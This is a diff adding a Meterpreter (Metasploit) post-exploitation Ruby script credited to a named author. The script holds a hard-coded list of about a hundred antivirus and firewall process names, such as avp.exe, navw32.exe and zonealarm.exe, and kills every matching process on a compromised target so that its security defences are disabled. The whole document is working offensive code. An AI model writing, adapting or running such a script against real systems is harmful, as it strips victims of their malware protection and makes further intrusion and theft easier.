@@ -1,0 +1,129 @@
+#
+# Meterpreter script that kills all Antivirus processes
+# Provided by: Jerome Athias <jerome.athias [at] free.fr>
+#
+
+print_status("Killing Antivirus services on the target...")
+
+avs = %W{
+	avgnt.exe
+	avguard.exe
+	avp.exe 
+	avp.exe 
+	ackwin32.exe
+	anti-trojan.exe
+	apvxdwin.exe
+	autodown.exe
+	avconsol.exe
+	ave32.exe
+	avgctrl.exe
+	avkserv.exe
+	avnt.exe
+	avp.exe
+	avp32.exe
+	avpcc.exe
+	avpdos32.exe
+	avpm.exe
+	avptc32.exe
+	avpupd.exe
+	avsched32.exe
+	avwin.exe
+	avwin95.exe
+	avwupd32.exe
+	blackd.exe
+	blackice.exe
+	cfiadmin.exe
+	cfiaudit.exe
+	cfinet.exe
+	cfinet32.exe
+	claw95.exe
+	claw95cf.exe
+	cleaner.exe
+	cleaner3.exe
+	defwatch.exe
+	dvp95.exe
+	dvp95_0.exe
+	ecengine.exe
+	esafe.exe
+	espwatch.exe
+	f-agnt95.exe
+	f-prot.exe
+	f-prot95.exe
+	f-stopw.exe
+	findviru.exe
+	fp-win.exe
+	fprot.exe
+	frw.exe
+	iamapp.exe
+	iamserv.exe
+	ibmasn.exe
+	ibmavsp.exe
+	icload95.exe
+	icloadnt.exe
+	icmon.exe
+	icsupp95.exe
+	icsuppnt.exe
+	iface.exe
+	iomon98.exe
+	jedi.exe
+	lockdown2000.exe
+	lookout.exe
+	luall.exe
+	moolive.exe
+	mpftray.exe
+	n32scanw.exe
+	navapw32.exe
+	navlu32.exe
+	navnt.exe
+	navw32.exe
+	navwnt.exe
+	nisum.exe
+	nmain.exe
+	normist.exe
+	nupgrade.exe
+	nvc95.exe
+	outpost.exe
+	padmin.exe
+	pavcl.exe
+	pavsched.exe
+	pavw.exe
+	pccwin98.exe
+	pcfwallicon.exe
+	persfw.exe
+	rav7.exe
+	rav7win.exe
+	rescue.exe
+	safeweb.exe
+	scan32.exe
+	scan95.exe
+	scanpm.exe
+	scrscan.exe
+	serv95.exe
+	smc.exe
+	sphinx.exe
+	sweep95.exe
+	tbscan.exe
+	tca.exe
+	tds2-98.exe
+	tds2-nt.exe
+	vet95.exe
+	vettray.exe
+	vscan40.exe
+	vsecomr.exe
+	vshwin32.exe
+	vsstat.exe
+	webscanx.exe
+	wfindv32.exe
+	zonealarm.exe
+	_avp32.exe
+	_avpcc.exe
+	_avpm.exe
+}
+
+client.sys.process.get_processes().each do |x|
+	if (avs.index(x['name'].downcase))
+		print_status("Killing off #{x['name']}...")
+		client.sys.process.kill(x['pid'])
+	end
+end
+
